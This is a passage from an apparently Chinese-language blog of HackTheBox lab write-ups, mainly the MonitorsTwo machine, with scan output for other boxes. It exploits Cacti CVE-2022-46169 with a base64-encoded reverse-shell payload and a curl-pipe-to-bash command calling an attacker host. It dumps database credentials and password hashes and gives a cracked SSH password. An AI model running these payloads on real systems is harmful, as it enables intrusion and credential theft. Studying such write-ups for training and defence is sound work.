1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">|_ssl-date: 2023-06-07T21:55:16+00:00; +8h00m00s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: ------T21:55:17+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: -----T21:55:19+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: -------T21:54:38</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现域名sequel.htb与子域名dc.sequel.htb</p>
<h2 id="3-MonitorsTwo-版本漏洞"><a href="#3-MonitorsTwo-版本漏洞" class="headerlink" title="3.MonitorsTwo(版本漏洞)"></a>3.MonitorsTwo(版本漏洞)</h2><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/130957041?ops_request_misc=%7B%22request_id%22:%22168749798516800211583630%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168749798516800211583630&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-130957041-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=MonitorsTwo&spm=1018.2226.3001.4187">HTB MonitorsTwo_清风–的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43264813/article/details/130860974?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-0-130860974-blog-130957041.235%5Ev38%5Epc_relevant_sort_base3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">HackTheBox系列-MonitorsTwo_夜白君的博客-CSDN博客</a></p>
<h3 id="1-扫描端口"><a href="#1-扫描端口" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p><code>nmap -Pn 10.10.11.211 </code></p>
<blockquote>
<p>22和80</p>
</blockquote>
<p>访问</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621162319430.png"></p>
<p>这是一个Cacti的框架 Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
<p>抓个包</p>
<blockquote>
<p>POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 143<br>Origin: <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a><br>Connection: close<br>Referer: <a target="_blank" rel="noopener" href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a><br>Cookie: Cacti&#x3D;23c13c8cedf59e7ab5692967d58edba1; CactiDateTime&#x3D;Wed Jun 21 2023 16:26:22 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480<br>Upgrade-Insecure-Requests: 1</p>
<p>__csrf_magic&#x3D;sid%3A85cdbc25916003d0deb870cb3312ad1f4dbe3b51%2C1687335980&amp;action&#x3D;login&amp;login_username&#x3D;admin123&amp;login_password&#x3D;123&amp;remember_me&#x3D;on</p>
</blockquote>
<p>没看出来。</p>
<p>dirb扫描路径</p>
<blockquote>
<p>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/docs/">http://10.10.11.211/docs/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/images/">http://10.10.11.211/images/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/include/">http://10.10.11.211/include/</a>                                                                 </p>
<ul>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a> (CODE:200|SIZE:13844)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/install/">http://10.10.11.211/install/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/lib/">http://10.10.11.211/lib/</a>                                                                     </li>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/LICENSE">http://10.10.11.211/LICENSE</a> (CODE:200|SIZE:15171)                                                         </li>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/log">http://10.10.11.211/log</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/plugins/">http://10.10.11.211/plugins/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/resource/">http://10.10.11.211/resource/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/scripts/">http://10.10.11.211/scripts/</a>                                                                 </li>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/server-status">http://10.10.11.211/server-status</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/service/">http://10.10.11.211/service/</a></li>
</ul>
<p>—- Entering directory: <a target="_blank" rel="noopener" href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a> —-</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/cache/index.php">http://10.10.11.211/cache/index.php</a> (CODE:302|SIZE:0)</li>
</ul>
</blockquote>
<p>没什么用</p>
<h3 id="2-版本漏洞"><a href="#2-版本漏洞" class="headerlink" title="2.版本漏洞"></a>2.版本漏洞</h3><p>回过头看看版本信息Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
<p>谷歌一下</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621201847673.png"></p>
<p>命令注入漏洞 (CVE-2022-46169)<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/">https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/</a></p>
<p>以下有两种做法，做法1，我的没实现成功；成功的是做法2。</p>
<h4 id="做法1："><a href="#做法1：" class="headerlink" title="做法1："></a>做法1：</h4><p>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;<code>bash+-c+&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code><br><code>bash -i &gt;&amp; /dev/tcp/10.10.14.96/1234 0&gt;&amp;1 //这个是攻击机的地址</code></p>
<blockquote>
<p>base64后：</p>
<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Dk4y1E7kf/">Hack The Box 赛季活动靶场【MonitorsTwo】User&amp;System Flag攻略_哔哩哔哩_bilibili</a></p>
<p>构造这个</p>
<blockquote>
<p><strong>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;`bash+-c+”{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}”&#96; HTTP&#x2F;1.1</strong><br><strong>X-Forwarded-For: 127.0.0.1</strong><br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: CactiDateTime&#x3D;Wed Jun 21 2023 22:26:48 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480; Cacti&#x3D;662c23c759cac6c538f02c2d2cb02919<br>Upgrade-Insecure-Requests: 1</p>
</blockquote>
<p>repeater发送之前，nc监听</p>
<p>nc -lvnp 1234，但是，没反应。</p>
<h4 id="做法2："><a href="#做法2：" class="headerlink" title="做法2："></a>做法2：</h4><p>换一条路。</p>
<p>下载以下地址的py文件。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sAsPeCt488/CVE-2022-46169/blob/main/CVE-2022-46169.py">CVE-2022-46169&#x2F;CVE-2022-46169.py at main · sAsPeCt488&#x2F;CVE-2022-46169 (github.com)</a></p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# vim 1234.sh</p>
<p>┌──(root㉿kali)-[~]<br>└─# cat 1234.sh<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.96&#x2F;1234 0&gt;&amp;1</p>
</blockquote>
<p>python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl 10.10.14.96&#x2F;1234.sh|bash</p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a target="_blank" rel="noopener" href="http://10.10.14.96/">http://10.10.14.96</a>“<br>[*] Trying for 1 - 100 host ids<br>[+] Exploit Completed for host_id &#x3D; 1</p>
</blockquote>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python -m http.server 80 </p>
<p>10.10.11.211 - - [21&#x2F;Jun&#x2F;2023 23:49:57] “GET &#x2F; HTTP&#x2F;1.1” 200 -</p>
</blockquote>
<blockquote>
<p>新开窗口，nc -lvnp 1234</p>
</blockquote>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a target="_blank" rel="noopener" href="http://10.10.14.96/1234.sh">http://10.10.14.96/1234.sh</a> | <strong>&#x2F;bin&#x2F;bash</strong>“<br>[*] Trying for 1 - 100 host ids</p>
</blockquote>
<p>查看监听窗口</p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# nc -lvnp 1234<br>listening on [any] 1234 …<br>connect to [10.10.14.96] from (UNKNOWN) [10.10.11.211] 54714<br>bash: cannot set terminal process group (1): Inappropriate ioctl for device<br>bash: no job control in this shell<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ </p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ ls -a<br>ls -a<br>.<br>..<br>.mdl_style.rb<br>.mdlrc<br>.rnd<br>CHANGELOG<br>LICENSE<br>README.md<br>about.php<br>aggregate_graphs.php<br>aggregate_items.php<br>aggregate_templates.php<br>auth_changepassword.php<br>auth_login.php<br>auth_profile.php<br>automation_devices.php<br>automation_graph_rules.php<br>automation_networks.php<br>automation_snmp.php<br>automation_templates.php<br>automation_tree_rules.php<br>boost_rrdupdate.php<br>cache<br>cacti.sql<br>cactid.php<br>cdef.php<br>cli<br>clog.php<br>clog_user.php<br>cmd.php<br>cmd_realtime.php<br>color.php<br>color_templates.php<br>color_templates_items.php<br>data_debug.php<br>data_input.php<br>data_queries.php<br>data_source_profiles.php<br>data_sources.php<br>data_templates.php<br>docs<br>formats<br>gprint_presets.php<br>graph.php<br>graph_image.php<br>graph_json.php<br>graph_realtime.php<br>graph_templates.php<br>graph_templates_inputs.php<br>graph_templates_items.php<br>graph_view.php<br>graph_xport.php<br>graphs.php<br>graphs_items.php<br>graphs_new.php<br>help.php<br>host.php<br>host_templates.php<br>images<br>include<br>index.php<br>install<br>lib<br>link.php<br>links.php<br>locales<br>log<br>logout.php<br>managers.php<br>mibs<br>permission_denied.php<br>plugins<br>plugins.php<br>poller.php<br>poller_automation.php<br>poller_boost.php<br>poller_commands.php<br>poller_dsstats.php<br>poller_maintenance.php<br>poller_realtime.php<br>poller_recovery.php<br>poller_reports.php<br>poller_spikekill.php<br>pollers.php<br>remote_agent.php<br>reports_admin.php<br>reports_user.php<br>resource<br>rra<br>rrdcleaner.php<br>script_server.php<br>scripts<br>service<br>service_check.php<br>settings.php<br>sites.php<br>snmpagent_mibcache.php<br>snmpagent_mibcachechild.php<br>snmpagent_persist.php<br>spikekill.php<br>templates_export.php<br>templates_import.php<br>tree.php<br>user_admin.php<br>user_domains.php<br>user_group_admin.php<br>utilities.php<br>vdef.php</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ cd include<br>cd include<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ ls<br>ls<br>auth.php<br>bottom_footer.php<br>cacti_version<br>cli_check.php<br>config.php<br>content<br>csrf.php<br>fa<br>fonts<br>global.php<br>global_arrays.php<br>global_constants.php<br>global_form.php<br>global_languages.php<br>global_session.php<br>global_settings.php<br>index.php<br>js<br>layout.js<br>plugins.php<br>realtime.js<br>session.php<br>themes<br>top_general_header.php<br>top_graph_header.php<br>top_header.php<br>vendor</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ cat config.php<br>cat config.php<br>&lt;?php<br>&#x2F;*<br> +————————————————————————-+<br> | Copyright (C) 2004-2020 The Cacti Group                                 |<br> |                                                                         |<br> | This program is free software; you can redistribute it and&#x2F;or           |<br> | modify it under the terms of the GNU General Public License             |<br> | as published by the Free Software Foundation; either version 2          |<br> | of the License, or (at your option) any later version.                  |<br> |                                                                         |<br> | This program is distributed in the hope that it will be useful,         |<br> | but WITHOUT ANY WARRANTY; without even the implied warranty of          |<br> | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |<br> | GNU General Public License for more details.                            |<br> +————————————————————————-+<br> | Cacti: The Complete RRDtool-based Graphing Solution                     |<br> +————————————————————————-+<br> | This code is designed, written, and maintained by the Cacti Group. See  |<br> | about.php and&#x2F;or the AUTHORS file for specific developer information.   |<br> +————————————————————————-+<br> | <a target="_blank" rel="noopener" href="http://www.cacti.net/">http://www.cacti.net/</a>                                                   |<br> +————————————————————————-+<br>*&#x2F;</p>
<p>&#x2F;*</p>
<ul>
<li>Make sure these values reflect your actual database&#x2F;host&#x2F;user&#x2F;password<br> *&#x2F;</li>
</ul>
<p>$database_type     &#x3D; ‘mysql’;<br>$database_default  &#x3D; ‘cacti’;<br>$database_hostname &#x3D; ‘db’;<br>$database_username &#x3D; ‘root’;<br>$database_password &#x3D; ‘root’;<br>$database_port     &#x3D; ‘3306’;<br>$database_retries  &#x3D; 5;<br>$database_ssl      &#x3D; false;<br>$database_ssl_key  &#x3D; ‘’;<br>$database_ssl_cert &#x3D; ‘’;<br>$database_ssl_ca   &#x3D; ‘’;<br>$database_persist  &#x3D; false;</p>
</blockquote>
<blockquote>
<p>define(‘DEBUG_SQL_FLOW’, true);www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root -e “show databases;”</strong></p>
<p>&lt;db –user&#x3D;root –password&#x3D;root -e “show databases;”<br>Database<br>information_schema<br>cacti<br>mysql<br>performance_schema<br>sys</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “show tables;”</strong><br>&lt;–user&#x3D;root –password&#x3D;root cacti -e “show tables;”<br>Tables_in_cacti<br>aggregate_graph_templates<br>aggregate_graph_templates_graph<br>aggregate_graph_templates_item<br>aggregate_graphs<br>aggregate_graphs_graph_item<br>aggregate_graphs_items<br>automation_devices<br>automation_graph_rule_items<br>automation_graph_rules<br>automation_ips<br>automation_match_rule_items<br>automation_networks<br>automation_processes<br>automation_snmp<br>automation_snmp_items<br>automation_templates<br>automation_tree_rule_items<br>automation_tree_rules<br>cdef<br>cdef_items<br>color_template_items<br>color_templates<br>colors<br>data_debug<br>data_input<br>data_input_data<br>data_input_fields<br>data_local<br>data_source_profiles<br>data_source_profiles_cf<br>data_source_profiles_rra<br>data_source_purge_action<br>data_source_purge_temp<br>data_source_stats_daily<br>data_source_stats_hourly<br>data_source_stats_hourly_cache<br>data_source_stats_hourly_last<br>data_source_stats_monthly<br>data_source_stats_weekly<br>data_source_stats_yearly<br>data_template<br>data_template_data<br>data_template_rrd<br>external_links<br>graph_local<br>graph_template_input<br>graph_template_input_defs<br>graph_templates<br>graph_templates_gprint<br>graph_templates_graph<br>graph_templates_item<br>graph_tree<br>graph_tree_items<br>host<br>host_graph<br>host_snmp_cache<br>host_snmp_query<br>host_template<br>host_template_graph<br>host_template_snmp_query<br>plugin_config<br>plugin_db_changes<br>plugin_hooks<br>plugin_realms<br>poller<br>poller_command<br>poller_data_template_field_mappings<br>poller_item<br>poller_output<br>poller_output_boost<br>poller_output_boost_local_data_ids<br>poller_output_boost_processes<br>poller_output_realtime<br>poller_reindex<br>poller_resource_cache<br>poller_time<br>processes<br>reports<br>reports_items<br>sessions<br>settings<br>settings_tree<br>settings_user<br>settings_user_group<br>sites<br>snmp_query<br>snmp_query_graph<br>snmp_query_graph_rrd<br>snmp_query_graph_rrd_sv<br>snmp_query_graph_sv<br>snmpagent_cache<br>snmpagent_cache_notifications<br>snmpagent_cache_textual_conventions<br>snmpagent_managers<br>snmpagent_managers_notifications<br>snmpagent_mibs<br>snmpagent_notifications_log<br><strong>user_auth</strong><br>user_auth_cache<br>user_auth_group<br>user_auth_group_members<br>user_auth_group_perms<br>user_auth_group_realm<br>user_auth_perms<br>user_auth_realm<br>user_domains<br>user_domains_ldap<br>user_log<br>vdef<br>vdef_items<br>version</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “select * from user_auth;”</strong></p>
</blockquote>
<blockquote>
<p>&lt;–password&#x3D;root cacti -e “select * from user_auth;”<br>id      username        password        realm   full_name       email_address   must_change_password    password_change      show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphspolicy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history     locked  failed_attempts lastfail        reset_perms<br>1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x6d;&#x6f;&#x6e;&#105;&#x74;&#x6f;&#x72;&#115;&#x74;&#119;&#111;&#46;&#x68;&#116;&#98;">&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x6d;&#x6f;&#x6e;&#105;&#x74;&#x6f;&#x72;&#115;&#x74;&#119;&#111;&#46;&#x68;&#116;&#98;</a>                on      on      on      on      on      2       1       1       1       1   on       -1      -1      -1              0       0       663348655<br>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on  31       1       1       1       1               -1      -1      -1              0       0       0<br>4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#109;&#97;&#x72;&#x63;&#x75;&#115;&#x40;&#109;&#x6f;&#110;&#105;&#x74;&#x6f;&#x72;&#115;&#116;&#x77;&#111;&#46;&#x68;&#x74;&#98;">&#109;&#97;&#x72;&#x63;&#x75;&#115;&#x40;&#109;&#x6f;&#110;&#105;&#x74;&#x6f;&#x72;&#115;&#116;&#x77;&#111;&#46;&#x68;&#x74;&#98;</a>                       on      on      on      on      1       1       1       1       1   on       -1      -1              on      0       0       2135691668</p>
</blockquote>
<p>密码都是哈希过的</p>
<p>用hashcat反解$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC的明文</p>
<p>解出来后得到密码</p>
<h3 id="3-ssh连接"><a href="#3-ssh连接" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p>然后ssh连接</p>
<p><code>ssh marcus@monitorstwo.htb </code></p>
<p>如果提示找不到</p>
<p><code>vim /etc/hosts</code> 添加</p>
<p> 10.10.11.211 monitorstwo.htb即可</p>
<p><strong>funkymonkey.</strong></p>
<h3 id="4-cat-user-txt"><a href="#4-cat-user-txt" class="headerlink" title="4.cat user.txt"></a>4.cat user.txt</h3><p>获取到flag。</p>
<h3 id="获取root-txt"><a href="#获取root-txt" class="headerlink" title="获取root.txt"></a>获取root.txt</h3><p>我没成功</p>
<h3 id="5-findmnt"><a href="#5-findmnt" class="headerlink" title="5.findmnt"></a>5.findmnt</h3><p><code>findmnt</code>&#x2F;&#x2F;显示当前挂载命令</p>
<blockquote>
<pre><code>                                            nsfs      rw
</code></pre>
<p>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;75<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69&#x2F;mounts&#x2F;shm<br>│                                     shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4Z<br>└─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e&#x2F;mounts&#x2F;shm<br>                                      shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k</p>
</blockquote>
<blockquote>
<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>total 108<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 .<br>drwx—–x 5 root root  4096 Jun 21 15:30 ..<br>drwxr-xr-x 1 root root  4096 Mar 22 13:21 bin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 boot<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 dev<br>-rwxr-xr-x 1 root root     0 Mar 21 10:49 .dockerenv<br>-rwxr-xr-x 1 root root     0 Jan  5 11:37 entrypoint.sh<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 etc<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 home<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 lib<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 lib64<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 media<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 mnt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 opt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 proc<br>drwx—— 1 root root  4096 Mar 21 10:50 root<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 run<br>drwxr-xr-x 1 root root  4096 Jan  9 09:30 sbin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 srv<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 sys<br>drwxrwxrwt 1 root root 20480 Jun 21 16:14 tmp<br>drwxr-xr-x 1 root root  4096 Nov 14  2022 usr<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 var</p>
</blockquote>
<h3 id="6-x2F-bin-x2F-bash-p"><a href="#6-x2F-bin-x2F-bash-p" class="headerlink" title="6.  .&#x2F;bin&#x2F;bash -p"></a>6.  .&#x2F;bin&#x2F;bash -p</h3><blockquote>
<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash<br>-rwxr-xr-x 1 root root 1234376 Mar 27  2022 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash</p>
</blockquote>
<blockquote>
<p>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash -p</p>
</blockquote>
<blockquote>
<p>marcus@monitorstwo:~$ cd &#x2F;root<br>bash: cd: &#x2F;root: Permission denied</p>
</blockquote>
<p>-p命令执行没效果。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>找到cms版本漏洞，使用已存在的漏洞进行攻击，通过监听拿到shell。</p>
<h2 id="4-PC"><a href="#4-PC" class="headerlink" title="4.PC"></a>4.PC</h2><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/130940490">HTB PC_清风–的博客-CSDN博客</a></p>
<p>[htb pc wp_春猿火的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request_id%22:%22168751647616800213092172%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168751647616800213092172&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=htb">https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request%5Fid%22%3A%22168751647616800213092172%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168751647616800213092172&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=htb</a> pc&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h3 id="1-扫描端口-1"><a href="#1-扫描端口-1" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p>默认扫描只扫到了22端口，试试全端口扫描</p>
<p><code>nmap -p0-65535 10.10.11.214</code></p>
<blockquote>
